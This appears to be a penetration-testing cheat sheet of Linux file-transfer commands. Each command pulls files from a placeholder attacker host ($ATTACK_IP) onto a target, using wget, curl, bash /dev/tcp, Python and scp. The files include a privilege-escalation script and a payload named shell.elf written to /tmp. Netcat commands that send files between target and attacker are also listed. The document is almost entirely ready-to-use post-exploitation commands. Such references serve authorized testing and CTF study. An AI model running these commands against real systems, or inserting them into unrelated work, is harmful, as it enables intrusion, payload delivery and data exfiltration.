# Linux File Transfers

## wget
```bash
wget http://$ATTACK_IP/linpeas.sh
wget http://$ATTACK_IP/shell.elf -O /tmp/shell.elf
```

## curl
```bash
curl -O http://$ATTACK_IP/linpeas.sh
curl http://$ATTACK_IP/shell.elf -o /tmp/shell.elf
```

## netcat
```bash
# Receive (target)
nc -lvp 4444 > file.txt

# Send (attack)
nc $TARGET_IP 4444 < file.txt
```

## bash /dev/tcp
```bash
exec 3<>/dev/tcp/$ATTACK_IP/80
echo -e "GET /linpeas.sh HTTP/1.1\n\n" >&3
cat <&3
```

## Python
```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://$ATTACK_IP/file', 'file')"
python2 -c "import urllib; urllib.urlretrieve('http://$ATTACK_IP/file', 'file')"
```

## SCP
```bash
scp user@$ATTACK_IP:/path/to/file .
```
